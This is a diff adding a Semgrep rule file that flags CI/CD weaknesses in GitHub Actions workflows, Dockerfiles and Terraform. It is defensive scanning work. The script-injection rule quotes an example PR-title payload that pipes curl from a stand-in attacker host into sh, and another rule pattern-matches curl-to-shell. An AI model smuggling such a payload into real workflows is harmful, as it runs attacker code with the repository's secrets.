@@ -1,0 +1,195 @@
+# CI / CD / GitHub Actions security Semgrep rules.
+#
+# Targets:
+#   - Unpinned GitHub Actions (supply-chain risk per tj-actions, trivy-action
+#     compromises)
+#   - Untrusted input reaching shell in workflows (pwn-request class)
+#   - Secrets exposed via echo / workflow logging
+#   - `pull_request_target` misuse (checks out PR code with write scope)
+#   - Over-permissioned workflow tokens
+#   - Self-hosted runner exposure
+#   - Dockerfile unsafe patterns (root, ADD remote URLs, no USER)
+#   - Terraform egress / public-access misconfig
+
+rules:
+  # --- GitHub Actions: pinning ---
+  - id: gha-action-pinned-to-tag-not-sha
+    patterns:
+      - pattern-regex: 'uses:\s*([\w.-]+/[\w.-]+)@(v\d+(\.\d+)*|main|master|latest|\w+)\s*$'
+      - pattern-not-regex: 'uses:\s*[\w.-]+/[\w.-]+@[a-f0-9]{40}'
+      - pattern-not-regex: 'uses:\s*\./'         # local action
+      - pattern-not-regex: 'uses:\s*actions/'    # GitHub-owned (lower risk, but still pin to SHA ideally)
+    message: |
+      Third-party GitHub Action pinned to a tag (or branch) instead of commit SHA.
+      Supply-chain risk: tags and branches are mutable. The `tj-actions/changed-files` (Mar 2025)
+      and `aquasecurity/trivy-action` (Mar 2026) compromises both involved tag overwrites that
+      compromised every user pinned to a tag.
+      Fix: pin to a 40-char commit SHA. Example: `uses: aquasecurity/trivy-action@19a2fd3cf3f2e00ab21f35d2ddec5ce4b2b2d3a2`
+      Dependabot + Renovate both support SHA pinning with tag comments for readability.
+    severity: ERROR
+    languages: [yaml]
+    paths:
+      include: [".github/workflows/**"]
+
+  # --- pull_request_target misuse (pwn-request) ---
+  - id: gha-pull-request-target-checkout-head
+    patterns:
+      - pattern-regex: 'on:\s*\n[^#]*pull_request_target'
+      - pattern-regex: 'ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.'
+    message: |
+      `pull_request_target` with checkout of PR head SHA — classic "pwn-request" pattern.
+      The workflow runs with write scope and has access to secrets; checking out untrusted PR code
+      means a malicious PR can execute arbitrary code with full write access to your repo.
+      Fix: use `pull_request` (read-only, no secrets) for PR-testing workflows.
+      If you must use `pull_request_target` (e.g., to post labels), do NOT check out PR code;
+      only use it for safe operations on metadata.
+      Reference: https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
+    severity: ERROR
+    languages: [yaml]
+    paths:
+      include: [".github/workflows/**"]
+
+  # --- Excessive permissions: write-all with no scoping ---
+  - id: gha-permissions-write-all
+    patterns:
+      - pattern-regex: 'permissions:\s*write-all'
+    message: |
+      Workflow grants `permissions: write-all` — token has full write to every GitHub resource.
+      If any step is compromised (via dep injection, pwn-request, compromised action), the attacker
+      gains full repo write + secrets access.
+      Fix: scope permissions minimally. Start with `permissions: {}` (empty = no permissions) and grant
+      only what each step needs. Example:
+        permissions:
+          contents: read
+          pull-requests: write
+    severity: WARNING
+    languages: [yaml]
+    paths:
+      include: [".github/workflows/**"]
+
+  # --- Script injection via untrusted event input ---
+  - id: gha-script-injection-event-context
+    pattern-regex: 'run:\s*.*\$\{\{\s*github\.event\.(issue\.title|issue\.body|pull_request\.title|pull_request\.body|comment\.body|review\.body|pages\.[^}]+|head_commit\.message|commits\[[0-9]+\]\.message|head_commit\.author\.(name|email))\s*\}\}'
+    message: |
+      GitHub Actions script injection: attacker-controlled event context directly interpolated into `run:` shell script.
+      An attacker writes a PR title like `"; curl evil.example | sh; echo "` — executes on your runner with the workflow's secrets.
+      Fix: pass the value via an environment variable, then reference the env var in the script. Shell quoting will handle it safely:
+          env:
+            PR_TITLE: ${{ github.event.pull_request.title }}
+          run: echo "$PR_TITLE"
+      Reference: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable
+    severity: ERROR
+    languages: [yaml]
+    paths:
+      include: [".github/workflows/**"]
+
+  # --- Secret exposure via echo ---
+  - id: gha-secret-echo
+    patterns:
+      - pattern-regex: '(echo|print|printf|cat).*\$\{\{\s*secrets\.'
+      - pattern-not-regex: 'GITHUB_STEP_SUMMARY'     # sometimes used legitimately for non-sensitive env
+    message: |
+      Secret referenced in an echo/print — GitHub Actions masks secrets in logs but:
+      (1) character-by-character reveals can defeat masking, (2) secrets passed through transformations
+      lose masking, (3) collaborators with workflow-log access see the command line.
+      Fix: pass secrets via env, never interpolate into logged shell commands. If you need to debug,
+      use a length check (`[[ ${#SECRET} -gt 0 ]] && echo "secret present"`) not `echo "$SECRET"`.
+    severity: WARNING
+    languages: [yaml]
+    paths:
+      include: [".github/workflows/**"]
+
+  # --- Self-hosted runner on public repo without isolation ---
+  - id: gha-self-hosted-on-public
+    patterns:
+      - pattern-regex: 'runs-on:\s*(self-hosted|\[.*self-hosted.*\])'
+    message: |
+      Self-hosted runner. If this repo is public OR accepts PRs from forks, any attacker can submit a
+      PR whose workflow runs on your infrastructure with your network access.
+      Fix: (1) use GitHub-hosted runners for public repos, (2) if self-hosted is required, use
+      ephemeral runners (e.g., ARC / Philips labs runners) that are destroyed after each job,
+      (3) restrict workflow triggers on public repos — require approval for first-time contributor workflows.
+      Reference: https://docs.github.com/en/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security
+    severity: WARNING
+    languages: [yaml]
+    paths:
+      include: [".github/workflows/**"]
+
+  # --- StepSecurity harden-runner recommendation (informational) ---
+  - id: gha-no-egress-hardening
+    patterns:
+      - pattern-regex: 'on:\s*\n.*(push|pull_request|workflow_dispatch)'
+      - pattern-not-regex: 'step-security/harden-runner'
+    message: |
+      INFO: no egress policy on this workflow. Consider `step-security/harden-runner@<SHA>` as the first
+      step — it pins outbound egress to an allowlist, logs all network calls, and blocks the common
+      class of supply-chain attacks that exfiltrate via a compromised action.
+      This is advisory; not all workflows need it. High-leverage for release workflows and workflows
+      with significant secrets access.
+    severity: INFO
+    languages: [yaml]
+    paths:
+      include: [".github/workflows/**"]
+
+  # --- Dockerfile: running as root ---
+  - id: dockerfile-no-user
+    patterns:
+      - pattern-regex: '^FROM\s'
+      - pattern-not-regex: '^USER\s'
+    message: |
+      Dockerfile does not specify a non-root USER. Container runs as root by default.
+      Fix: add `USER 1000:1000` (or a named user created earlier) before CMD/ENTRYPOINT.
+      Pairs with Kubernetes `runAsNonRoot: true` in PodSecurityContext.
+    severity: WARNING
+    languages: [dockerfile]
+
+  # --- Dockerfile: ADD with remote URL ---
+  - id: dockerfile-add-remote-url
+    pattern-regex: '^ADD\s+https?://'
+    message: |
+      Dockerfile `ADD <remote-url>` — ADD from a URL does NOT validate TLS beyond the default,
+      is not cached consistently, and couples your build to the liveness of the remote.
+      Fix: use `RUN curl -fsSL --tlsv1.3 <url> -o <file> && sha256sum -c <file>.sha256`
+      with a pinned hash.
+    severity: WARNING
+    languages: [dockerfile]
+
+  # --- Dockerfile: curl | sh in RUN ---
+  - id: dockerfile-curl-pipe-shell
+    pattern-regex: 'RUN\s+.*(curl|wget).*\|\s*(sh|bash)'
+    message: |
+      `curl | sh` in Dockerfile — installs unverified script content from the network at build time.
+      Fix: download the script, inspect it, pin a hash, then execute. At minimum use `--tlsv1.3` and
+      verify a published checksum.
+    severity: ERROR
+    languages: [dockerfile]
+
+  # --- Terraform: security group 0.0.0.0/0 ingress ---
+  - id: terraform-sg-open-ingress
+    patterns:
+      - pattern: |
+          ingress {
+            ...
+            cidr_blocks = ["0.0.0.0/0"]
+            ...
+          }
+    message: |
+      Security group rule allows ingress from 0.0.0.0/0 (public internet).
+      If this is not an intentional public service (ALB, CloudFront origin), this is a finding.
+      Fix: restrict to a CIDR range, or use VPC peering / PrivateLink / SSM Session Manager for admin access.
+    severity: WARNING
+    languages: [hcl, terraform]
+
+  # --- Terraform: S3 bucket with public read ---
+  - id: terraform-s3-public-acl
+    pattern-either:
+      - pattern: |
+          acl = "public-read"
+      - pattern: |
+          acl = "public-read-write"
+    message: |
+      S3 bucket with public ACL. Public buckets are the #1 source of accidental data exposure on AWS.
+      Fix: use AWS BlockPublicAccess at the account level; use CloudFront + OAI for legitimately public content;
+      prefer signed URLs for user-specific access.
+    severity: ERROR
+    languages: [hcl, terraform]
